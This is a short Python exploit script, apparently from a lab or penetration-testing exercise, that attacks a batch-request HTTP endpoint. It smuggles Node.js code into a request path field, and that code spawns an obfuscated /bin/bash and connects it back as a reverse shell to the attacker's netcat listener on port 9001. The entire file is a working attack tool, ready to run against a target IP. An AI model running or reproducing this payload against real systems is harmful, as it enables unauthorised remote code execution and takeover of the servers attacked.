import sys
import os
import json
import requests
# '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'

def send_request(target):
	# Samples
	request1 = json.dumps({
		"method": "get",
		"path": "/profile"
	})
	request2 = json.dumps({
		"method": "get",
		"path": "/item"
	})
	request3 = json.dumps({
		"method":"get",
		"path": "/item/$1.id;"
	})

	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	print("Sending reverse shell... Ensure netcat listening on port 9001")

	cmd = "\\\\x2fbin\\\\x2fbash"
	shell = f'var net = require(\'net\'),sh=require(\'child_process\').exec(\'{cmd}\');'
	shell += 'var client = new net.Socket();'
	shell += f'client.connect({LPORT}, \'{LHOST}\', function(){{'
	shell += 'client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'

	request = f'{{"method": "get","path": "/item/$1.id;{shell}"}}'
	# payload = f'{{"requests":[{request1},{request2},{request3}]}}'
	payload = f'{{"requests":[{request1},{request2},{request}]}}'
	print("Payload: ", payload)

	r = requests.post(target, payload)
	print("Response: ", r.text)

def main():
    if len(sys.argv) != 2:
        print (f"(+) usage: {sys.argv[0]} <ip>")
        print (f"(+) eg: {sys.argv[0]} 192.168.121.103")
        sys.exit(-1)

    ip = sys.argv[1]
    target = f"http://{ip}:8080/batch"
    send_request(target)


if __name__ == "__main__":
    main()